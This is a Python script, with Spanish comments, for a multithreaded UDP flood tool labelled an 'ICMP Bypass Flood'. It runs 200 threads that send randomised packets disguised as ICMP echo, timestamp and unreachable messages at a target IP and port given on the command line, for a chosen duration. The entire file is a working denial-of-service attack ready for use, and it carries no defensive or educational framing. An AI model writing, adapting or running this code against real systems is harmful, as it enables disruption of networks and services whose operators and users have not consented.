import socket
import struct
import random
import sys
import time
import threading

def icmp_bypass_udp(target_ip, target_port, duration):
    """ICMP-like flood usando UDP como transporte"""
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Emular diferentes tipos de ICMP en payload UDP
    def create_icmp_like_payload():
        icmp_types = {
            b'ECHO': b'\x45\x43\x48\x4f',  # "ECHO" en ASCII
            b'TIME': b'\x54\x49\x4d\x45',  # "TIME"
            b'MASK': b'\x4d\x41\x53\x4b',  # "MASK"
            b'INFO': b'\x49\x4e\x46\x4f',  # "INFO"
        }
        
        # Elegir tipo ICMP simulado
        icmp_type = random.choice(list(icmp_types.values()))
        
        # Añadir secuencia y ID
        icmp_id = random.randint(0, 65535).to_bytes(2, 'big')
        icmp_seq = random.randint(0, 65535).to_bytes(2, 'big')
        
        # Timestamp
        timestamp = int(time.time()).to_bytes(8, 'big')
        
        # Datos adicionales
        extra_data = random._urandom(random.randint(20, 100))
        
        # Puerto objetivo incluido en datos
        port_data = target_port.to_bytes(2, 'big')
        
        # Construir payload
        payload = icmp_type + icmp_id + icmp_seq + timestamp + port_data + extra_data
        
        return payload
    
    def create_ping_style_payload():
        # Payload estilo Ping (ICMP Echo Request)
        payload = b'PING'  # Magic word
        payload += random.randint(1000, 9999).to_bytes(4, 'big')  # ID
        payload += random.randint(1, 100).to_bytes(4, 'big')  # Sequence
        payload += int(time.time() * 1000).to_bytes(8, 'big')  # Timestamp
        payload += target_port.to_bytes(2, 'big')  # Puerto objetivo
        payload += b'\x00' * 8  # Padding
        payload += random._urandom(random.randint(20, 60))  # Random data
        
        return payload
    
    def create_timestamp_payload():
        # Payload estilo ICMP Timestamp
        payload = b'TIME'  # Magic word
        payload += int(time.time()).to_bytes(8, 'big')  # Originate
        payload += b'\x00' * 8  # Receive (0)
        payload += b'\x00' * 8  # Transmit (0)
        payload += target_port.to_bytes(2, 'big')  # Puerto
        payload += random._urandom(random.randint(10, 50))
        
        return payload
    
    def create_unreachable_payload():
        # Payload estilo ICMP Unreachable
        unreachable_codes = [
            b'NET',  # Network unreachable
            b'HOST',  # Host unreachable
            b'PROT',  # Protocol unreachable
            b'PORT',  # Port unreachable
        ]
        
        payload = random.choice(unreachable_codes)
        payload += target_port.to_bytes(2, 'big')
        payload += random.randint(0, 255).to_bytes(1, 'big')  # Code
        payload += random._urandom(random.randint(30, 80))
        
        return payload
    
    # Métodos de payload
    payload_methods = [
        create_icmp_like_payload,
        create_ping_style_payload,
        create_timestamp_payload,
        create_unreachable_payload,
    ]
    
    timeout = time.time() + duration
    
    print(f"[+] ICMP Bypass via UDP a {target_ip}:{target_port}")
    
    packet_count = 0
    
    while time.time() < timeout:
        try:
            # Seleccionar método de payload
            method = random.choice(payload_methods)
            payload = method()
            
            # Enviar como UDP
            sock.sendto(payload, (target_ip, target_port))
            
            # Enviar múltiples paquetes rápidamente
            for _ in range(random.randint(1, 10)):
                method = random.choice(payload_methods)
                payload = method()
                sock.sendto(payload, (target_ip, target_port))
                packet_count += 1
            
            packet_count += 1
            
            # Mostrar progreso
            if packet_count % 100 == 0:
                print(f"\r[+] Paquetes: {packet_count}", end="")
                
        except Exception as e:
            sock.close()
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    sock.close()
    print(f"\n[+] Completado: {packet_count} paquetes")

def start_flood(target_ip, target_port, duration):
    """Iniciar flood con múltiples hilos"""
    
    threads = []
    num_threads = 200
    
    print(f"[+] Iniciando ICMP Bypass Flood")
    print(f"[+] Target: {target_ip}:{target_port}")
    print(f"[+] Duración: {duration}s")
    print(f"[+] Hilos: {num_threads}")
    
    for i in range(num_threads):
        t = threading.Thread(target=icmp_bypass_udp, args=(target_ip, target_port, duration))
        t.daemon = True
        t.start()
        threads.append(t)
    
    time.sleep(duration)
    print(f"[+] Flood completado")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: icmp_bypass.py <ip> <port> <time>")
        print("Example: python3 icmp_bypass.py 192.168.1.1 80 60")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    duration = int(sys.argv[3])
    
    start_flood(target_ip, target_port, duration)
